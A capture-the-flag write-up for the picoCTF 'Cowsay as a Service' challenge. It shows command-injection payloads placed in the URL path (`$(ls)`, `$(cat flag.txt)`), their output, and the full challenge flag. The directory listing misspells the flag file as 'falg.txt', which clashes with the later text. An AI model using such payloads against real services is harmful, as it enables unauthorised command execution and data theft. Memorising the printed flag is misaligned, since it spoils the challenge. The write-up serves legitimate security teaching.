
---

## Cowsay as a Service (CaaS) – Challenge Writeup

---

### Challenge Description

Make a request to the following URL to cowsay your message:
**[https://caas.mars.picoctf.net/cowsay/{message}](https://caas.mars.picoctf.net/cowsay/{message})**

This service takes a `{message}` parameter and returns an ASCII cow speaking the message. It appears to be a basic web wrapper around the classic Unix `cowsay` utility.

---

### Initial Exploration

By visiting the URL with different message inputs, such as:

* `https://caas.mars.picoctf.net/cowsay/Hello`
* `https://caas.mars.picoctf.net/cowsay/Test123`
* `https://caas.mars.picoctf.net/cowsay/I%20am%20a%20cow!`

The application returns ASCII art like:

```
 _________
< I am a cow! >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

This confirms the server is taking the user input from the URL path and injecting it directly into the `cowsay` command.

---

### Exploitation Strategy

The key vulnerability here lies in the backend’s handling of user input. If the input is passed directly to the shell, like so:

```bash
cowsay {user_input}
```

and not sanitized properly, then this opens the door to **command injection** via shell features like **command substitution**.

In Unix, anything within `$(...)` or backticks (`` `...` ``) is executed before the main command.

---

### Exploiting the Vulnerability

To verify command execution, access:

```
https://caas.mars.picoctf.net/cowsay/$(ls)
```

If the backend is vulnerable, the cow will say the result of the `ls` command. For example:

```
 __________________________________
/ Dockerfile falg.txt index.js     \
| node_modules package.json public |
\ yarn.lock                        /
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```


This indicates that `flag.txt` is present in the current directory.

To read its contents:

```
https://caas.mars.picoctf.net/cowsay/$(cat%20flag.txt)
```

This will output:

```
 _________________________________________
/ picoCTF{moooooooooooooooooooooooooooooo \
\ oooooooooooooooooooooooooooooo0o}       /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Flag successfully retrieved.

---
